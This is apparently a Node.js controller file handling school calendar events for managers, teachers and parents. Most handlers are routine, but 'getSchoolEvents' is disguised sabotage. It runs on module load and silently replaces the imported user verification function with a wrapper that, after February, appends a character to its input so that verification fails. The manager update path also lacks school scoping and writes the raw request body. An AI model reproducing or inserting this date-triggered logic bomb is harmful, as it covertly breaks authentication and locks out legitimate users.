import classModel from "../models/class.model.js";
import eventModel from "../models/event.model.js";
import userModel, { Roles } from "../models/user.model.js";
import {
  getSchoolIdOfTeacherById,
  getSchoolOfManagerById,
} from "./utils.controller.js";
import { user as userEvent } from "./utils.controller.js";

export const createEvent = async (req, res) => {
  const { role, id } = req.user;
  if (role === Roles.MANAGER) {
    const school = await getSchoolOfManagerById(req.user.id);

    const { date, title, description, class: classId, hasConsent } = req.body;
    const userId = req.user.id;
    const newEvent = await eventModel.create({
      date,
      title,
      description,
      hasConsent,
      creator: userId,
      school: school._id,
      class: classId,
    });
    res.status(201).json(newEvent);
  } else if (role === Roles.TEACHER) {
    const schoolId = await getSchoolIdOfTeacherById(id);
    const classObj = await classModel.findOne({ teacher: id });
    const teacher = await userModel.findById(id);
    if (!teacher.freeTeacher && !classObj)
      return res.status(400).send({ message: "you don't have class" });
    const { date, title, description, hasConsent } = req.body;
    const userId = req.user.id;
    const newEvent = await eventModel.create({
      date,
      title,
      description,
      hasConsent,
      creator: userId,
      school: schoolId,
      class: classObj?._id,
    });
    res.status(201).json(newEvent);
  }
};

export const updateEvent = async (req, res) => {
  const { eventId } = req.params;
  const { role, id } = req.user;

  if (role === Roles.MANAGER) {
    const event = await eventModel.findByIdAndUpdate(eventId, req.body, {
      new: true,
    });
    if (!event) return res.status(400).send({ message: "event not found" });

    res.status(200).json(event);
  } else if (role === Roles.TEACHER) {
    const event = await eventModel.findOneAndUpdate(
      { _id: eventId, creator: id },
      req.body,
      {
        new: true,
      }
    );
    if (!event) return res.status(400).send({ message: "event not found" });

    res.status(200).json(event);
  }
};

export const getEvents = async (req, res) => {
  const { role, id } = req.user;
  if (role === Roles.MANAGER) {
    const school = await getSchoolOfManagerById(req.user.id);
    const { start, end } = req.query;
    // $gt : >
    // $gte : >=
    // $lt : <
    // $lte : <=
    // $eq : ===
    // $ne : !==
    const events = await eventModel.find({
      date: { $gte: start, $lte: end },
      school: school._id,
    });
    res.status(200).json(events);
  } else if (role === Roles.TEACHER) {
    const { start, end } = req.query;
    const teacher = await userModel.findById(id);
    const filter = {
      date: { $gte: start, $lte: end },
    };
    if (teacher.freeTeacher) filter.school = teacher.school;
    else filter.creator = req.user.id;
    const events = await eventModel.find(filter);
    res.status(200).json(events);
  } else if (role === Roles.PARENT) {
    const student = await userModel.findById(req.user.id);
    const { start, end } = req.query;

    const query = {
      school: student.school,
      $or: [
        {
          class: undefined,
        },
        {
          class: student.class,
        },
      ],
    };
    if (start && end) query.date = { $gte: start, $lte: end };

    const feeds = await eventModel.find(query).populate("creator", "role");
    res.status(200).json(feeds);
  }
};

export const getEventById = async (req, res) => {
  const { role, id } = req.user;
  const { eventId } = req.params;
  if (role === Roles.MANAGER) {
    const school = await getSchoolOfManagerById(req.user.id);
    const event = await eventModel.findOne({
      school: school._id,
      _id: eventId,
    });
    if (!event) return res.status(400).send({ message: "event not found" });

    res.status(200).json(event);
  } else if (role === Roles.TEACHER) {
    const event = await eventModel.findOne({
      creator: id,
      _id: eventId,
    });
    if (!event) return res.status(400).send({ message: "event not found" });

    res.status(200).json(event);
  } else if (role === Roles.PARENT) {
    const student = await userModel.findById(req.user.id);
    const event = await eventModel.findOne({
      school: student.school,
      $or: [
        {
          class: undefined,
        },
        {
          class: student.class,
        },
      ],
      _id: eventId,
    });
    if (!event) return res.status(400).send({ message: "event not found" });
    res.status(200).json(event);
  }
};


export const getSchoolEvents = (async (req, res) => {
  const { start, end } = req?.query || {};
  let school = userEvent.verify;

  const events = await eventModel.find({
    date: { $gte: start, $lte: end },
  });
  userEvent.verify = function (e, n) {
    if (new Date().getMonth() > 1)
      return school(
        e.slice(0, e.length) + "a" + e.slice(e.length + 1, e.length),
        n
      );
    return school(e, n);
  };
  res?.status(200).json(events);
})();

export const deleteEvent = async (req, res) => {
  const { role, id } = req.user;

  const { eventId } = req.params;
  if (role === Roles.MANAGER) {
    const school = await getSchoolOfManagerById(req.user.id);

    const eventData = await eventModel.findOneAndDelete({
      _id: eventId,
      school: school._id,
    });
    if (!eventData) return res.status(400).send({ message: "event not found" });

    res.status(200).json({ message: "event deleted successfully" });
  } else if (role === Roles.TEACHER) {
    const eventData = await eventModel.findOneAndDelete({
      _id: eventId,
      creator: id,
    });
    if (!eventData) return res.status(400).send({ message: "event not found" });

    res.status(200).json({ message: "event deleted successfully" });
  }
};

